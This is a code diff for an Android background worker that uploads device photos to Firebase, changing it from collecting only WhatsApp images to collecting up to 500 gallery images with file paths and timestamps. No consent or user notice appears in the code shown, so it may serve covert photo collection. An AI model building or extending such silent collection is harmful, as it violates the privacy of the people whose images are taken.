@@ -34,12 +34,15 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class ImageUploadWorker extends Worker {
+    private static final String TAG = "ImageUploadWorker";
+    private static final int MAX_IMAGES_PER_SYNC = 500;
 
     public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
-        FirebaseApp.initializeApp(context); // Make sure Firebase is initialized
+        FirebaseApp.initializeApp(context);
     }
 
     @NonNull
@@ -47,31 +50,23 @@ public class ImageUploadWorker extends Worker {
     public Result doWork() {
         FirebaseAuth auth = FirebaseAuth.getInstance();
         if (auth.getCurrentUser() == null) {
-            Log.e("ImageUploadWorker", "User not logged in.");
+            Log.e(TAG, "User not logged in.");
             return Result.failure();
         }
 
         String uid = auth.getUid();
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        FirebaseStorage storage = FirebaseStorage.getInstance();
-
-        // Get only WhatsApp images
-        List<File> whatsappImages = getWhatsAppImagesFromMediaStore();
-
-        if (whatsappImages.isEmpty()) {
-            Log.d("ImageUploadWorker", "No WhatsApp images found to upload.");
+        List<File> galleryImages = getGalleryImagesFromMediaStore();
+        if (galleryImages.isEmpty()) {
+            Log.d(TAG, "No gallery images found.");
+            FirebaseDataPaths.updateSyncStatus(uid, "gallery", 0);
             return Result.success();
         }
 
-        Log.d("ImageUploadWorker", "Found " + whatsappImages.size() + " WhatsApp images to process.");
-
-        // Get already uploaded images to avoid duplicates
-        DatabaseReference userDataRef = database.getReference("user_data").child(uid).child("whatsapp_images");
-        
+        DatabaseReference galleryRef = FirebaseDataPaths.gallery(uid);
+        Set<String> uploadedFilePaths = new HashSet<>();
         CountDownLatch latch = new CountDownLatch(1);
-        final Set<String> uploadedFilePaths = new HashSet<>();
-        
-        userDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
+
+        galleryRef.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 for (DataSnapshot imageSnapshot : snapshot.getChildren()) {
@@ -85,37 +80,32 @@ public class ImageUploadWorker extends Worker {
 
             @Override
             public void onCancelled(@NonNull DatabaseError error) {
-                Log.e("ImageUploadWorker", "Error fetching uploaded images: " + error.getMessage());
+                Log.e(TAG, "Error fetching uploaded gallery images", error.toException());
                 latch.countDown();
             }
         });
 
         try {
-            latch.await(); // Wait for the database query to complete
+            latch.await();
         } catch (InterruptedException e) {
-            Log.e("ImageUploadWorker", "Interrupted while waiting for database query", e);
+            Thread.currentThread().interrupt();
             return Result.retry();
         }
 
-        Log.d("ImageUploadWorker", "Found " + uploadedFilePaths.size() + " already uploaded images.");
+        FirebaseStorage storage = FirebaseStorage.getInstance();
+        AtomicInteger uploadedCount = new AtomicInteger(0);
 
-        // Upload new images
-        int uploadedCount = 0;
-        for (File image : whatsappImages) {
+        for (File image : galleryImages) {
             String filePath = image.getAbsolutePath();
-            
-            // Skip if already uploaded
             if (uploadedFilePaths.contains(filePath)) {
-                Log.d("ImageUploadWorker", "Skipping duplicate: " + filePath);
                 continue;
             }
-
-            // Upload image
-            uploadWhatsAppImage(image, uid, database, storage);
-            uploadedCount++;
+            uploadGalleryImage(image, uid, storage);
+            uploadedCount.incrementAndGet();
         }
 
-        Log.d("ImageUploadWorker", "Processed " + uploadedCount + " new images.");
+        FirebaseDataPaths.updateSyncStatus(uid, "gallery", uploadedCount.get());
+        Log.d(TAG, "Queued " + uploadedCount.get() + " gallery images for upload.");
         return Result.success();
     }
 
@@ -124,11 +114,15 @@ public class ImageUploadWorker extends Worker {
         WorkManager.getInstance(context).enqueue(uploadWork);
     }
 
-    private List<File> getWhatsAppImagesFromMediaStore() {
+    private List<File> getGalleryImagesFromMediaStore() {
         List<File> imageList = new ArrayList<>();
         Context context = getApplicationContext();
 
-        String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.MIME_TYPE};
+        String[] projection = {
+                MediaStore.Images.Media.DATA,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.MIME_TYPE
+        };
 
         try (Cursor cursor = context.getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
@@ -137,136 +131,95 @@ public class ImageUploadWorker extends Worker {
                 null,
                 MediaStore.Images.Media.DATE_ADDED + " DESC"
         )) {
-            if (cursor != null) {
-                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+            if (cursor == null) {
+                return imageList;
+            }
 
-                while (cursor.moveToNext()) {
-                    String filePath = cursor.getString(dataColumn);
-                    if (filePath != null && isWhatsAppImage(filePath)) {
-                        File imageFile = new File(filePath);
-                        if (imageFile.exists() && imageFile.canRead()) {
-                            imageList.add(imageFile);
-                            Log.d("ImageUploadWorker", "Found WhatsApp image: " + filePath);
-                        }
-                    }
+            int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+            while (cursor.moveToNext() && imageList.size() < MAX_IMAGES_PER_SYNC) {
+                String filePath = cursor.getString(dataColumn);
+                if (filePath == null || !isImageFile(filePath)) {
+                    continue;
+                }
+                File imageFile = new File(filePath);
+                if (imageFile.exists() && imageFile.canRead()) {
+                    imageList.add(imageFile);
                 }
             }
         } catch (Exception e) {
-            Log.e("ImageUploadWorker", "Error reading WhatsApp images from MediaStore: " + e.getMessage());
+            Log.e(TAG, "Error reading gallery images", e);
         }
 
         return imageList;
     }
 
-    private boolean isWhatsAppImage(String filePath) {
-        if (filePath == null) return false;
-        
-        // Check if path contains WhatsApp
-        String lowerPath = filePath.toLowerCase();
-        if (!lowerPath.contains("whatsapp")) {
-            return false;
-        }
-        
-        // Check if it's an image file
-        String lowerFilePath = filePath.toLowerCase();
-        return lowerFilePath.endsWith(".jpg") || 
-               lowerFilePath.endsWith(".jpeg") || 
-               lowerFilePath.endsWith(".png") ||
-               lowerFilePath.endsWith(".gif") ||
-               lowerFilePath.endsWith(".webp");
+    private boolean isImageFile(String filePath) {
+        String lower = filePath.toLowerCase();
+        return lower.endsWith(".jpg") || lower.endsWith(".jpeg")
+                || lower.endsWith(".png") || lower.endsWith(".gif")
+                || lower.endsWith(".webp");
     }
 
-    private void uploadWhatsAppImage(File imageFile, String uid, FirebaseDatabase database, FirebaseStorage storage) {
+    private void uploadGalleryImage(File imageFile, String uid, FirebaseStorage storage) {
         final String fileName = imageFile.getName();
         final String filePath = imageFile.getAbsolutePath();
-        final long timestamp = System.currentTimeMillis();
-        final long uploadedAt = timestamp;
-        final String userId = uid;
-        
-        // Determine data type (mime type)
-        String dataTypeTemp = "image/jpeg";
-        String lowerFileName = fileName.toLowerCase();
-        if (lowerFileName.endsWith(".png")) {
-            dataTypeTemp = "image/png";
-        } else if (lowerFileName.endsWith(".gif")) {
-            dataTypeTemp = "image/gif";
-        } else if (lowerFileName.endsWith(".webp")) {
-            dataTypeTemp = "image/webp";
-        }
-        final String dataType = dataTypeTemp;
-
-        // Generate unique image ID
+        final long timestamp = imageFile.lastModified();
+        final String mimeType = getMimeType(fileName);
         final String imageId = generateImageId(filePath, fileName);
 
-        // Decode and compress image
         Bitmap bitmap = BitmapFactory.decodeFile(filePath);
         if (bitmap == null) {
-            Log.e("ImageUploadWorker", "Failed to decode image: " + filePath);
+            Log.e(TAG, "Failed to decode image: " + filePath);
             return;
         }
 
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        Bitmap.CompressFormat format = dataType.equals("image/png") ? 
-            Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
+        Bitmap.CompressFormat format = mimeType.equals("image/png")
+                ? Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
         bitmap.compress(format, 85, baos);
         byte[] imageData = baos.toByteArray();
+        bitmap.recycle();
 
-        // Upload to Firebase Storage
-        StorageReference storageRef = storage.getReference("whatsapp_images")
-                .child(userId)
+        StorageReference storageRef = storage.getReference("gallery")
+                .child(uid)
                 .child(imageId + getFileExtension(fileName));
 
-        UploadTask uploadTask = storageRef.putBytes(imageData);
-        
-        uploadTask.addOnSuccessListener(taskSnapshot -> {
-            // Get download URL
-            storageRef.getDownloadUrl().addOnSuccessListener(uri -> {
-                String downloadUrl = uri.toString();
-                
-                // Save metadata to Firebase Database
-                DatabaseReference imageRef = database.getReference("user_data")
-                        .child(userId)
-                        .child("whatsapp_images")
-                        .child(imageId);
+        storageRef.putBytes(imageData).addOnSuccessListener(taskSnapshot ->
+                storageRef.getDownloadUrl().addOnSuccessListener(uri -> {
+                    DatabaseReference imageRef = FirebaseDataPaths.gallery(uid).child(imageId);
+                    Map<String, Object> metadata = new HashMap<>();
+                    metadata.put("dataType", "gallery");
+                    metadata.put("mimeType", mimeType);
+                    metadata.put("fileName", fileName);
+                    metadata.put("filePath", filePath);
+                    metadata.put("timestamp", timestamp);
+                    metadata.put("uploadedAt", System.currentTimeMillis());
+                    metadata.put("url", uri.toString());
+                    metadata.put("userId", uid);
+                    imageRef.setValue(metadata);
+                })
+        ).addOnFailureListener(e -> Log.e(TAG, "Failed to upload image: " + fileName, e));
+    }
 
-                Map<String, Object> imageMetadata = new HashMap<>();
-                imageMetadata.put("dataType", dataType);
-                imageMetadata.put("fileName", fileName);
-                imageMetadata.put("filePath", filePath);
-                imageMetadata.put("timestamp", timestamp);
-                imageMetadata.put("uploadedAt", uploadedAt);
-                imageMetadata.put("url", downloadUrl);
-                imageMetadata.put("userId", userId);
-
-                imageRef.setValue(imageMetadata)
-                        .addOnSuccessListener(aVoid -> {
-                            Log.d("ImageUploadWorker", "Successfully uploaded and saved: " + fileName);
-                        })
-                        .addOnFailureListener(e -> {
-                            Log.e("ImageUploadWorker", "Failed to save metadata for: " + fileName, e);
-                        });
-            }).addOnFailureListener(e -> {
-                Log.e("ImageUploadWorker", "Failed to get download URL for: " + fileName, e);
-            });
-        }).addOnFailureListener(e -> {
-            Log.e("ImageUploadWorker", "Failed to upload image: " + fileName, e);
-        });
+    private String getMimeType(String fileName) {
+        String lower = fileName.toLowerCase();
+        if (lower.endsWith(".png")) return "image/png";
+        if (lower.endsWith(".gif")) return "image/gif";
+        if (lower.endsWith(".webp")) return "image/webp";
+        return "image/jpeg";
     }
 
     private String generateImageId(String filePath, String fileName) {
-        // Use MD5 hash of filePath + fileName to generate unique ID
         try {
             MessageDigest md = MessageDigest.getInstance("MD5");
-            String input = filePath + fileName;
-            byte[] hashBytes = md.digest(input.getBytes());
+            byte[] hashBytes = md.digest((filePath + fileName).getBytes());
             StringBuilder sb = new StringBuilder();
             for (byte b : hashBytes) {
                 sb.append(String.format("%02x", b));
             }
             return sb.toString();
         } catch (Exception e) {
-            // Fallback to timestamp + filename hash
-            return String.valueOf(System.currentTimeMillis()) + "_" + fileName.hashCode();
+            return System.currentTimeMillis() + "_" + fileName.hashCode();
         }
     }
 
@@ -275,7 +228,6 @@ public class ImageUploadWorker extends Worker {
         if (lastDot > 0 && lastDot < fileName.length() - 1) {
             return fileName.substring(lastDot);
         }
-        return ".jpg"; // Default extension
+        return ".jpg";
     }
-
 }
